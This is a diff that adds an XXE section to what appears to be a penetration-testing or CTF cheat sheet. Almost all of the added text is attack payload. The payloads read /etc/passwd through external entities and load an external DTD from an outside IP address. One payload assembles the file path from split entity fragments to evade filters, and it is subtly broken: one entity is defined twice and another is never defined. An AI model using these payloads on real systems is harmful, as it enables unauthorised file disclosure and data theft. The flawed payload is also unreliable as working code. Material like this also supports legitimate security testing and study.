@@ -114,6 +114,52 @@ Metadata tables:
         * `TABLE_NAME` for table name
         * `COLUMN_NAME` for column name
 
+### XXE
+
+Basic XXE payload:
+
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY bar SYSTEM "file:///etc/passwd">
+]>
+```
+
+External dtds:
+
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % bar SYSTEM "http://178.128.122.17/external.dtd">
+%bar;
+]>
+```
+
+``` xml
+<!ENTITY data SYSTEM "file:///etc/passwd">
+```
+
+Parameterised payload:
+
+``` xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % bar SYSTEM "http://178.128.122.17/external.dtd">
+%bar;
+]>
+```
+
+``` xml
+<!ENTITY % one "file:">
+<!ENTITY % two "///et">
+<!ENTITY % three "c/pas">
+<!ENTITY % three "swd">
+<!ENTITY % PATH "%one;%two;%three;%four;">
+
+<!ENTITY % fleg '<!ENTITY data SYSTEM "%PATH;">'>
+%fleg;
+```
+
 ### Injection
 
 ``` php
